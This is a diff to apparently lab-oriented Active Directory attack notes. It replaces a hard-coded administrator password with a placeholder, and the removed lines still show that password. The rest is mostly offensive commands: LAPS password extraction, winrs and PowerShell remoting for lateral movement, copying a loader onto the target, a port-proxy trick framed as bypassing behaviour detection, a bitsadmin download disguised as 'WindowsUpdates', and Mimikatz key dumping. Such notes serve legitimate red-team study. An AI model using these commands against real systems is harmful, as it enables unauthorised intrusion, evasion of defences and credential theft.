@@ -255,7 +255,7 @@ Get-DomainObject -Identity <computer> | select -ExpandProperty ms-mcs-admpwd
 **Access the machine with the password**:
 ```powershell
 winrs -r:<computer> -u:.\administrator -p:<passwd> cmd
-$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
+$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
 $mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
 $mailmgmt
@@ -272,14 +272,14 @@ $mailmgmt
 
 winrs:
 ```powershell
-winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator t7HoBF+m]ctv.]
+winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator <password>
 echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
 net use x: /d
 ```
 
 **Bypass behaviour detection**:
 ```powershell
-winrs -r:<computer> -u:.\administrator -p:t7HoBF+m]ctv.] cmd
+winrs -r:<computer> -u:.\administrator -p:<password> cmd
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
 ```
 
@@ -291,13 +291,13 @@ sekurlsa::keys
 
 **Microsoft signed binary to download NetLoader**:
 ```powershell
-winrs -r:<computer> -u:.\administrator -p:t7HoBF+m]ctv.]
+winrs -r:<computer> -u:.\administrator -p:<password>
 "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
 ```
 
 **PowerShell Remoting and Invoke-Mimi**:
 ```powershell
-$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
+$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
 $mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
 Enter-PSSession $mailmgmt
